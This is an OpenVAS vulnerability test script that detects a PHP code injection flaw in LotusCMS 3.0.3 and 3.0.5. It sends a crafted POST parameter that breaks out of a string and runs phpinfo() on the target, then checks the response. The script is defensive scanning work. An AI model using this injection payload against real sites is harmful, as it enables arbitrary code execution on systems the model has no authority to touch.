###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_lotuscms_php_code_exec_2011.nasl 12 2013-10-27 11:15:33Z jan $
#
# LotusCMS PHP Code Execution Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "LotusCMS is prone to two PHP Code Execution Vulnerabilities because it
fails to properly sanitize user-supplied input.

An attacker can exploit this vulnerability to execute arbitrary PHP code.

LotusCMS 3.0.3 and 3.0.5 are vulnerable; other versions may also be
affected.";


if (description)
{
 script_id(103444);
 script_version ("$Revision: 12 $");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("LotusCMS PHP Code Execution Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://secunia.com/secunia_research/2011-21/");
 script_xref(name : "URL" , value : "http://www.lotuscms.org/");

 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-03-07 11:02:50 +0100 (Wed, 07 Mar 2012)");
 script_description(desc);
 script_summary("Determine if it is possible to execute php code");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

host = get_host_name();

dirs = make_list("/lcms","/cms","/lotuscms",cgi_dirs());

foreach dir (dirs) {
   
  url = string(dir, "/index.php"); 

  if(buf = http_vuln_check(port:port, url:url,pattern:'(Powered by.*LotusCMS|content="LotusCMS")')) {

    p = eregmatch(pattern:"index.php\?page=([a-zA-Z0-9]+)", string:buf);
    if(isnull(p[1]))exit(0);

    page = p[1];
    ex = "page=" + page + "');phpinfo();#";
    len = strlen(ex);

    req = string("POST ",dir,"/index.php HTTP/1.1\r\n",
                 "Host: ",host,"\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ",len,"\r\n",
                 "\r\n",
                  ex,
                 "\r\n\r\n");

    result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

    if("<title>phpinfo()" >< result) {
      security_hole(port:port);
      exit(0);
    }

  }
}

exit(0);
